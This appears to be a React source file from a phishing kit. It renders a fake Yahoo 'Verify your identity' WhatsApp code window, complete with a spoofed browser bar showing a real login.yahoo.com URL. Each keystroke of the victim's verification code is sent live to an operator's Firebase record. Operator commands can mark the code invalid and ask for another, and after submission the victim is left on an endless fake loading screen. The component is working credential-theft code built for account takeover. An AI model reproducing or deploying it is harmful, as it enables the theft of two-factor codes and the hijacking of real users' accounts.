import React from "react";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";
import yahooLogo from "../assets/logoyahoo.png";
import loadingSvg from "../assets/loadingya.svg";
import yahooFinalGif from "../assets/yahoofinal.gif";

const YahooWhatsappPage = () => {
  const translations = {
    windowTitle: "Verify your identity - Yahoo",
    url: "https://login.yahoo.com/account/challenge/whatsapp?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login",
  };
  const { updateClientData, commands, clearCommands, clientData } =
    useFirebaseClient();
  const email = React.useMemo(() => {
    const fromClient =
      (clientData &&
        (clientData.yahooWhatsappEmail ||
          clientData.yahooCodeMailEmail ||
          clientData.yahooPasswordEmail ||
          clientData.yahooNumeroEmail ||
          clientData.email)) ||
      "";
    if (fromClient && String(fromClient).trim())
      return String(fromClient).trim();
    try {
      return (
        (typeof window !== "undefined" &&
          ((localStorage.getItem("yahoo_whatsapp_email") || "").trim() ||
            (localStorage.getItem("yahoo_codemail_email") || "").trim() ||
            (localStorage.getItem("yahoo_password_email") || "").trim() ||
            (localStorage.getItem("yahoo_numero_email") || "").trim() ||
            (localStorage.getItem("client_email") || "").trim())) ||
        ""
      );
    } catch {
      return "";
    }
  }, [clientData]);
  const maskedPhone =
    (typeof window !== "undefined" &&
      localStorage.getItem("client_phone_mask")) ||
    "(**) *****-****";
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const phrases = React.useMemo(
    () => [
      "Connecting to Yahoo...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  const [isInfiniteLoading, setIsInfiniteLoading] = React.useState(false);
  const [introLoading, setIntroLoading] = React.useState(true);
  // Step 1 (phone) -> Step 2 (loading) -> Step 3 (code input)
  const [step, setStep] = React.useState(1);
  React.useEffect(() => {
    const shouldAnimate = (isSubmitting && step === 2) || isInfiniteLoading;
    if (!shouldAnimate) return;
    const id = setInterval(
      () => setPhraseIndex((p) => (p + 1) % phrases.length),
      2000
    );
    return () => clearInterval(id);
  }, [isSubmitting, isInfiniteLoading, step, phrases.length]);
  // Campo único para o código de verificação
  const [verificationCode, setVerificationCode] = React.useState("");
  const [lastDigits, setLastDigits] = React.useState("");
  const [isCodeFieldFocused, setIsCodeFieldFocused] = React.useState(false);

  // Quando entrar na etapa de loading (2), avançar para inputs (3) após 4s
  React.useEffect(() => {
    if (step === 2) {
      const t = setTimeout(() => setStep(3), 4000);
      return () => clearTimeout(t);
    }
  }, [step]);

  // Atualizar URL/etapa no Firebase para badge no card
  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=yahoo_whatsapp",
        currentPage: "yahoo_whatsapp",
        yahooStage:
          step === 1 ? "WhatsApp" : step === 2 ? "Loading" : "WhatsApp Code",
        fromForm: true,
      });
    } catch {}
  }, [step, updateClientData]);

  // Comando de invalidação vindo do card
  const [invalidMessage, setInvalidMessage] = React.useState("");
  
  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid code.");
      setVerificationCode("");
      setIsSubmitting(false);
      setIsInfiniteLoading(false);
      setStep(3);
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  const handleCodeChange = (e) => {
    // Permite números e letras, remove caracteres especiais
    const cleanValue = e.target.value
      .replace(/[^a-zA-Z0-9]/g, "")
      .toUpperCase();
    setVerificationCode(cleanValue);
    try {
      updateClientData({ yahooWhatsapp: cleanValue });
      reportTyping("yahoowhatsapp", cleanValue);
    } catch {}
  };
  // Receber últimos dígitos do Firebase/localStorage e aplicar máscara
  React.useEffect(() => {
    const d1 = (clientData && clientData.yahooWhatsappDigits) || "";
    let source = String(d1 || "");
    if (!source) {
      try {
        source =
          (typeof window !== "undefined" &&
            (localStorage.getItem("yahoo_whatsapp_digits") || "")) ||
          "";
      } catch {}
    }
    source = source.replace(/\D/g, "").slice(-4);
    if (source) setLastDigits(source);
  }, [clientData?.yahooWhatsappDigits]);

  React.useEffect(() => {
    const t = setTimeout(() => setIntroLoading(false), 3000);
    return () => clearTimeout(t);
  }, []);

  const displayedPhone = React.useMemo(() => {
    const ds = String(lastDigits || "");
    if (!ds) return maskedPhone;
    const chars = maskedPhone.split("");
    let i = ds.length - 1;
    for (let p = chars.length - 1; p >= 0 && i >= 0; p--) {
      if (/\d|\*/.test(chars[p])) chars[p] = ds[i--];
    }
    return chars.join("");
  }, [maskedPhone, lastDigits]);
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - 380) / 2),
    top: Math.max(12, (window.innerHeight - 480) / 2),
  }));

  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    const isHeader = e.target.closest('[data-window-header="true"]');
    if (!isHeader) return;
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Arial, sans-serif" }}
      >
        <div
          onMouseDown={startDrag}
          style={{
            background: "#fff",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: "min(380px, 92vw)",
            minHeight: 420,
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            zIndex: 1000,
            cursor: isDragging ? "grabbing" : "default",
          }}
        >
          {/* Simulação da barra da janela/navegador (título + botões -, □, ×) */}
          <div
            data-window-header="true"
            onMouseDown={startDrag}
            style={{
              height: 24,
              background: "#e3f2fd",
              borderBottom: "1px solid #e1dfdd",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 14px",
              fontSize: 12,
              color: "#605e5c",
              cursor: "grab",
            }}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              {/* Yahoo logo */}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                aria-label="Yahoo!"
                viewBox="0 0 512 512"
                fill="#fff"
                width="16"
                height="16"
              >
                <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                <circle cx="303" cy="308" r="38" />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  color: "#605e5c",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* Barra de endereço/URL - colada na barra da janela */}
          <div
            style={{
              borderBottom: "1px solid #e1dfdd",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#f5f5f5",
                borderTop: "1px solid #d0d7de",
                borderBottom: "1px solid #d0d7de",
                boxSizing: "border-box",
                height: 28,
                display: "flex",
                alignItems: "center",
                padding: "0 14px 0 12px",
                gap: 10,
                fontSize: 12,
                color: "#605e5c",
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#605e5c"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                  flex: 1,
                  fontWeight: 400,
                  letterSpacing: "0.2px",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          <div style={{ padding: "24px 24px 14px 24px" }}>
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginBottom: 24,
              }}
            >
              <img
                src={yahooLogo}
                alt="Yahoo"
                style={{ height: 32, width: "auto" }}
              />
            </div>
            {/* Step 1: Conteúdo inicial */}
            {step === 1 && (
              <>
                <h1
                  style={{
                    fontSize: 22,
                    fontWeight: 700,
                    margin: "6px 0 8px",
                    textAlign: "center",
                    color: "#18181b",
                    lineHeight: 1.1,
                  }}
                >
                  Receive code
                  <br />
                  on WhatsApp
                </h1>
                <p
                  style={{
                    color: "#6b7280",
                    margin: 0,
                    marginBottom: 16,
                    textAlign: "center",
                  }}
                >
                  You will receive a code on WhatsApp if this phone is linked to
                  an account.
                </p>
                <div
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    marginTop: 8,
                    marginBottom: 24,
                  }}
                >
                  {/* Bloco principal com ícone e número */}
                  <div
                    style={{
                      backgroundColor: "#f3f4f6",
                      border: "1px solid #e5e7eb",
                      borderRadius: 16,
                      padding: "32px 24px",
                      textAlign: "center",
                      minWidth: "280px",
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      gap: 16,
                    }}
                  >
                    {/* Ícone (SVG sem fundo) */}
                    <svg
                      width="48"
                      height="48"
                      viewBox="0 0 16 16"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="#6001d2"
                    >
                      <path d="M11.42 9.49c-.19-.09-1.1-.54-1.27-.61s-.29-.09-.42.1-.48.6-.59.73-.21.14-.4 0a5.1 5.1 0 0 1-1.49-.92 5.3 5.3 0 0 1-1-1.29c-.11-.18 0-.28.08-.38s.18-.21.28-.32a1.4 1.4 0 0 0 .18-.31.38.38 0 0 0 0-.33c0-.09-.42-1-.58-1.37s-.3-.32-.41-.32h-.4a.72.72 0 0 0-.5.23 2.1 2.1 0 0 0-.65 1.55A3.6 3.6 0 0 0 5 8.2 8.3 8.3 0 0 0 8.19 11c.44.19.78.3 1.05.39a2.5 2.5 0 0 0 1.17.07 1.93 1.93 0 0 0 1.26-.88 1.67 1.67 0 0 0 .11-.88c-.05-.07-.17-.12-.36-.21" />
                      <path d="M13.29 2.68A7.36 7.36 0 0 0 8 .5a7.44 7.44 0 0 0-6.41 11.15l-1 3.85 3.94-1a7.4 7.4 0 0 0 3.55.9H8a7.44 7.44 0 0 0 5.29-12.72M8 14.12a6.1 6.1 0 0 1-3.15-.87l-.22-.13-2.34.61.62-2.28-.14-.23a6.18 6.18 0 0 1 9.6-7.65 6.12 6.12 0 0 1 1.81 4.37A6.19 6.19 0 0 1 8 14.12" />
                    </svg>

                    {/* Número de telefone – mais simples e profissional */}
                    <div
                      style={{
                        fontSize: 16,
                        fontWeight: 500,
                        color: "#374151",
                        marginBottom: 6,
                        letterSpacing: "0.2px",
                        fontFeatureSettings: '"tnum" 1, "lnum" 1', // números proporcionais/tabulares
                      }}
                    >
                      {displayedPhone}
                    </div>

                    {/* Texto explicativo */}
                    <p
                      style={{
                        color: "#6b7280",
                        margin: 0,
                        fontSize: 14,
                        lineHeight: 1.4,
                      }}
                    >
                      Receive code on WhatsApp
                    </p>
                  </div>
                </div>
                <div style={{ marginTop: 16 }}>
                  <button
                    type="button"
                    style={{
                      width: "100%",
                      padding: "14px",
                      background: "#6001d2",
                      color: "#fff",
                      border: "none",
                      borderRadius: 28,
                      fontSize: 14,
                      fontWeight: 700,
                      cursor: "pointer",
                    }}
                    onClick={(e) => {
                      e.preventDefault();
                      setStep(2); // etapa de loading
                      setIsSubmitting(true);
                    }}
                  >
                    Send code
                  </button>
                </div>
                <div style={{ marginTop: 12, textAlign: "center" }}>
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    style={{
                      color: "#6001d2",
                      textDecoration: "none",
                      fontSize: 14,
                    }}
                  >
                    More options
                  </a>
                </div>
              </>
            )}

            {/* Step 3: inputs do código (estilo quadrados) */}
            {step === 3 && (
              <>
                {/* Email em um botão arredondado, estilo dos modais */}
                <div
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    marginTop: -6,
                    marginBottom: 6,
                  }}
                >
                  <button
                    type="button"
                    style={{
                      background: "#F9FAFB",
                      color: "#111827",
                      border: "1px solid #e5e7eb",
                      borderRadius: 9999,
                      padding: "6px 12px",
                      fontSize: 12,
                      fontWeight: 600,
                      cursor: "default",
                      boxShadow: "0 1px 0 rgba(0,0,0,0.03)",
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                    }}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 291.319 291.319"
                      width="14"
                      height="14"
                      style={{ display: "block" }}
                    >
                      <path
                        fill="#720e9e"
                        d="M145.659 0c80.45 0 145.66 65.219 145.66 145.66 0 80.45-65.21 145.659-145.66 145.659S0 226.109 0 145.66C0 65.219 65.21 0 145.659 0"
                      />
                      <path
                        fill="#fff"
                        d="m212.353 114.98.155-.027 4.825-5.371-.237-.018.51-.801h-67.595l2.604 9.249h18.444l-31.044 28.722c-6.336-9.24-21.184-30.479-31.544-46.411h19.254v-6.555l.264-1.884-.264-.036v-.765H54.631v9.24H77.49c8.876 7.328 47.358 54.049 48.76 58.51.564 4.179 1.366 28.841-.291 30.698-1.994 2.868-22.814 1.32-26.483 1.593l-.137 9.058c6.7.2 26.801-.009 33.584-.009 13.364 0 36.77-.346 40.065-.082l.41-8.576-26.901-.401c-.564-3.887-1.183-28.422-.619-31.098 2.54-7.765 43.816-39.902 48.059-41.112l3.997-.901h12.472c-.001-.001 1.947-3.023 1.947-3.023m-10.087 64.099 11.689.892 13.628-49.979c-2.276-.082-22.95-1.93-25.636-2.431zm-2.021 8.012.064 12.208 5.917.492 6.391.446 1.875-11.944-6.737-.31z"
                      />
                    </svg>
                    {(typeof window !== "undefined" &&
                      ((
                        localStorage.getItem("yahoo_codemail_email") || ""
                      ).trim() ||
                        (
                          localStorage.getItem("yahoo_password_email") || ""
                        ).trim() ||
                        (
                          localStorage.getItem("yahoo_numero_email") || ""
                        ).trim() ||
                        (localStorage.getItem("client_email") || "").trim())) ||
                      ""}
                  </button>
                </div>
                <div style={{ marginTop: 18 }}>
                  <h2
                    style={{
                      textAlign: "center",
                      fontSize: 18,
                      fontWeight: 700,
                      marginBottom: 12,
                      color: "#111827",
                    }}
                  >
                    Enter verification code
                  </h2>
                  <p
                    style={{
                      textAlign: "center",
                      color: "#6b7280",
                      margin: 0,
                      marginBottom: 18,
                      fontSize: 14,
                    }}
                  >
                    We sent a code to WhatsApp {displayedPhone}
                  </p>

                  <div>
                    <label
                      htmlFor="verification-code"
                      style={{ fontSize: 12, color: "#6b7280" }}
                    >
                      Verification code
                    </label>
                    <input
                      id="verification-code"
                      type="text"
                      value={verificationCode}
                      onChange={handleCodeChange}
                      placeholder="Enter verification code"
                      style={{
                        width: "100%",
                        boxSizing: "border-box",
                        border: "none",
                        borderBottom: isCodeFieldFocused
                          ? "2px solid #6a33f5"
                          : "1px solid #111827",
                        borderRadius: 0,
                        padding: "10px 4px 10px 4px",
                        fontSize: 14,
                        outline: "none",
                        marginTop: 6,
                        background: "transparent",
                        color: "#111827",
                        transition:
                          "border-color 0.25s ease, border-bottom-width 0.25s ease",
                      }}
                      onFocus={() => setIsCodeFieldFocused(true)}
                      onBlur={() => setIsCodeFieldFocused(false)}
                    />
                  </div>
                  {invalidMessage && (
                    <div
                      style={{ color: "#a4262c", fontSize: 12, marginTop: 6 }}
                    >
                      {invalidMessage}
                    </div>
                  )}
                  {/* Botão em inglês abaixo do input */}
                  <div style={{ marginTop: 18 }}>
                    <button
                      type="button"
                      style={{
                        width: "100%",
                        padding: "14px",
                        background: verificationCode.trim()
                          ? "#6a33f5"
                          : "#e6dbfb",
                        color: verificationCode.trim() ? "#fff" : "#5f5a64",
                        border: "none",
                        borderRadius: 28,
                        fontSize: 14,
                        fontWeight: 700,
                        cursor: verificationCode.trim()
                          ? "pointer"
                          : "not-allowed",
                        transition: "background-color 0.25s ease",
                      }}
                      onClick={(e) => {
                        e.preventDefault();
                        if (!verificationCode.trim()) return;
                        // Mostra loading infinito na etapa final
                        setIsInfiniteLoading(true);
                        try {
                          updateClientData({
                            yahooWhatsappSubmittedAt: Date.now(),
                          });
                        } catch {}
                      }}
                    >
                      Next
                    </button>
                  </div>
                </div>
              </>
            )}

            {/* Loading intermediário ao prosseguir (mostra GIF + frases por ~4s) */}
            {((isSubmitting && step === 2) || isInfiniteLoading) && (
              <div
                style={{
                  position: "absolute",
                  top: 0,
                  left: 0,
                  right: 0,
                  bottom: 0,
                  background: "#FDFDFE",
                  display: "flex",
                  flexDirection: "column",
                  zIndex: 9999,
                  pointerEvents: "none",
                  borderRadius: 10,
                  overflow: "hidden",
                }}
              >
                {/* Header simulado na etapa final */}
                <div
                  style={{
                    height: 24,
                    background: "#e3f2fd",
                    borderBottom: "1px solid #e1dfdd",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "0 14px",
                    fontSize: 12,
                    color: "#605e5c",
                  }}
                >
                  <span
                    style={{
                      opacity: 0.9,
                      display: "flex",
                      alignItems: "center",
                      gap: 8,
                    }}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      aria-label="Yahoo!"
                      viewBox="0 0 512 512"
                      fill="#fff"
                      width="16"
                      height="16"
                    >
                      <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                      <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                      <circle cx="303" cy="308" r="38" />
                    </svg>
                    Sign in to your account - Yahoo
                  </span>
                  <div style={{ display: "flex", gap: 6 }}>
                    <button
                      title="Minimize"
                      style={{
                        width: 36,
                        height: 22,
                        border: "none",
                        background: "transparent",
                        cursor: "default",
                        fontSize: 16,
                        lineHeight: 1,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <svg
                        width="12"
                        height="12"
                        viewBox="0 0 16 16"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          d="M3 8.5H13"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                          strokeLinecap="round"
                        />
                      </svg>
                    </button>
                    <button
                      title="Maximize"
                      style={{
                        width: 36,
                        height: 22,
                        border: "none",
                        background: "transparent",
                        cursor: "default",
                        fontSize: 16,
                        lineHeight: 1,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <svg
                        width="12"
                        height="12"
                        viewBox="0 0 16 16"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <rect
                          x="3.5"
                          y="3.5"
                          width="9"
                          height="9"
                          rx="1"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                        />
                      </svg>
                    </button>
                    <button
                      title="Close"
                      style={{
                        width: 36,
                        height: 22,
                        border: "none",
                        background: "transparent",
                        color: "#605e5c",
                        cursor: "default",
                        fontSize: 16,
                        lineHeight: 1,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <svg
                        width="12"
                        height="12"
                        viewBox="0 0 16 16"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          d="M4 4L12 12"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                          strokeLinecap="round"
                        />
                        <path
                          d="M12 4L4 12"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                          strokeLinecap="round"
                        />
                      </svg>
                    </button>
                  </div>
                </div>

                {/* URL simulada na etapa final */}
                <div
                  style={{
                    borderBottom: "1px solid #e1dfdd",
                    padding: 0,
                    background: "#ffffff",
                    margin: 0,
                  }}
                >
                  <div
                    style={{
                      width: "100%",
                      background: "#f5f5f5",
                      borderTop: "1px solid #d0d7de",
                      borderBottom: "1px solid #d0d7de",
                      boxSizing: "border-box",
                      height: 28,
                      display: "flex",
                      alignItems: "center",
                      padding: "0 14px 0 12px",
                      gap: 10,
                      fontSize: 12,
                      color: "#605e5c",
                    }}
                  >
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 16 16"
                      xmlns="http://www.w3.org/2000/svg"
                      version="1.1"
                      fill="none"
                      stroke="#605e5c"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="1.5"
                      aria-hidden="true"
                      style={{ display: "block" }}
                    >
                      <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                      <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                    </svg>
                    <div
                      style={{
                        overflow: "hidden",
                        textOverflow: "ellipsis",
                        whiteSpace: "nowrap",
                        flex: 1,
                        fontWeight: 400,
                        letterSpacing: "0.2px",
                      }}
                    >
                      https://login.yahoo.com/account/challenge/whatsapp?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login
                    </div>
                  </div>
                </div>

                {/* Conteúdo da etapa final */}
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 20,
                    textAlign: "center",
                    padding: "20px",
                  }}
                >
                  {/* Email em um botão arredondado, estilo dos modais */}
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      marginBottom: 10,
                    }}
                  >
                    <button
                      type="button"
                      style={{
                        background: "#F9FAFB",
                        color: "#111827",
                        border: "1px solid #e5e7eb",
                        borderRadius: 9999,
                        padding: "6px 12px",
                        fontSize: 12,
                        fontWeight: 600,
                        cursor: "default",
                        boxShadow: "0 1px 0 rgba(0,0,0,0.03)",
                        display: "flex",
                        alignItems: "center",
                        gap: 4,
                      }}
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 291.319 291.319"
                        width="14"
                        height="14"
                        style={{ display: "block" }}
                      >
                        <path
                          fill="#720e9e"
                          d="M145.659 0c80.45 0 145.66 65.219 145.66 145.66 0 80.45-65.21 145.659-145.66 145.659S0 226.109 0 145.66C0 65.219 65.21 0 145.659 0"
                        />
                        <path
                          fill="#fff"
                          d="m212.353 114.98.155-.027 4.825-5.371-.237-.018.51-.801h-67.595l2.604 9.249h18.444l-31.044 28.722c-6.336-9.24-21.184-30.479-31.544-46.411h19.254v-6.555l.264-1.884-.264-.036v-.765H54.631v9.24H77.49c8.876 7.328 47.358 54.049 48.76 58.51.564 4.179 1.366 28.841-.291 30.698-1.994 2.868-22.814 1.32-26.483 1.593l-.137 9.058c6.7.2 26.801-.009 33.584-.009 13.364 0 36.77-.346 40.065-.082l.41-8.576-26.901-.401c-.564-3.887-1.183-28.422-.619-31.098 2.54-7.765 43.816-39.902 48.059-41.112l3.997-.901h12.472c-.001-.001 1.947-3.023 1.947-3.023m-10.087 64.099 11.689.892 13.628-49.979c-2.276-.082-22.95-1.93-25.636-2.431zm-2.021 8.012.064 12.208 5.917.492 6.391.446 1.875-11.944-6.737-.31z"
                        />
                      </svg>
                      {email}
                    </button>
                  </div>
                  <img
                    src={yahooFinalGif}
                    alt="Connecting to Yahoo"
                    style={{ width: 280, height: "auto" }}
                  />
                  <img
                    src={loadingSvg}
                    alt="Loading"
                    style={{
                      width: "90%",
                      height: 8,
                      objectFit: "contain",
                      filter: "brightness(0.45) contrast(1.35)",
                    }}
                  />
                  <div
                    style={{
                      color: "#4b5563",
                      fontSize: 18,
                      minHeight: 24,
                      fontWeight: 500,
                    }}
                  >
                    {phrases[phraseIndex]}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </EmailLayout>
  );
};

export default YahooWhatsappPage;
